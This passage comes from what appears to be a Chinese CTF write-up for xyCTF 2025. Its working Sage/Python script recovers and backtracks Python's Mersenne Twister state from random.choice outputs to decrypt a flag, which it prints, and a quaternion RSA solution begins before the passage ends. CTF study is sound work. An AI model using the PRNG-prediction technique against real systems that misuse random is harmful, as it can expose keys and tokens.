string">'</span></span><span class="token punctuation">)</span></code></pre>

<p>给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可</p>
<p>m长度可能与e有偏差，多试两位即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

test <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

Dall<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> r<span class="token punctuation">:</span>
    Dall<span class="token punctuation">.</span>append<span class="token punctuation">(</span>test<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>
D<span class="token operator">=</span>Dall
rng<span class="token operator">=</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getRows</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。</span>
    row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        row<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> row
M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#这一部分为固定套路，具体原因已经写在注释中了</span>

    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>
    temp <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token string">"1"</span><span class="token operator">*</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token punctuation">:</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#这个setstate也是固定格式，已于2025.1.21测试</span>
    M<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getRows<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span>


M<span class="token operator">=</span>Matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>M<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">.</span>rank<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------------------------------------------'</span><span class="token punctuation">)</span>

y<span class="token operator">=</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
s<span class="token operator">=</span>M<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>y<span class="token punctuation">)</span>


G<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    C<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        C<span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>
        C<span class="token operator">|</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>C<span class="token punctuation">)</span>

<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>G<span class="token punctuation">)</span>


<span class="token comment"># G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    

<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
RNG1<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">from</span> extend_mt19937_predictor <span class="token keyword">import</span> ExtendMT19937Predictor

predictor <span class="token operator">=</span> ExtendMT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    predictor<span class="token punctuation">.</span>setrandbits<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    predictor<span class="token punctuation">.</span>backtrack_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    
key<span class="token operator">=</span>predictor<span class="token punctuation">.</span>backtrack_getrandbits<span class="token punctuation">(</span>e<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>e<span class="token operator">^</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p><em><strong>0h_51mple_r@nd0m</strong></em></p>
<h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><p>四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r</p>
<p>但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ComComplex</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>value <span class="token operator">=</span> value
    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> k<span class="token punctuation">,</span>i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                s <span class="token operator">+=</span> <span class="token string">'+'</span>
            s <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'ijk'</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token operator">+</span>j <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">,</span>x<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__mul__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
        b <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        c <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        d <span class="token operator">=</span> self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>self<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>x<span class="token punctuation">.</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__mod__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token operator">%</span> x <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__pow__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
        a <span class="token operator">=</span> ComComplex<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> x<span class="token punctuation">:</span>
            <span class="token keyword">if</span> x <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>
                a <span class="token operator">*=</span> tmp
            tmp <span class="token operator">*=</span> tmp
            <span class="token keyword">if</span> n<span class="token punctuation">:</span>
                a <span class="token operator">%=</span> n
                tmp <span class="token operator">%=</span> n
            x <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">return</span> a
        
    <span class="token keyword">def</span> <span class="token function">inv</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mod<span class="token punctuation">)</span><span class="token punctuation">:</span>
        inv_len<span class="token operator">=</span>inverse<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span>i<span class="token operator">**</span><span class="token number">2</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">)</span><span class="token punctuation">,</span>mod<span class="token punctuation">)</span>
